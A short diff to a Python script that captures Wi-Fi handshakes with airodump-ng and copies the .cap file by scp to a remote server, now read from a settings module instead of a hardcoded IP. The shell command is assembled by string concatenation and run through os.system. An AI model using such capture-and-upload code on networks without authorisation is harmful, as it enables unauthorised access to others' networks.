@@ -7,6 +7,7 @@ from signal import SIGINT
 import time
 from database import *
 import shutil
+from server_settings import*
 
 def capture(channel, BSSID, interface, ESSID):
 	command=["sudo","airodump-ng","-c"]
@@ -36,7 +37,11 @@ def check_routine (BSSID, proc_airodump, ESSID):
 		os.rename("/home/isis/psk/psk-01.cap", filename)
 		command="scp "
 		command+=filename
-		command+=" isis@193.191.187.44:."
+		command+=" "
+		command+=server_username
+		command+="@"
+		command+=server_address
+		command+=":."
 		os.system(command)
 		os.kill(proc_airodump.pid, SIGINT)
 		hand_assignment(BSSID, ESSID, timestamp)
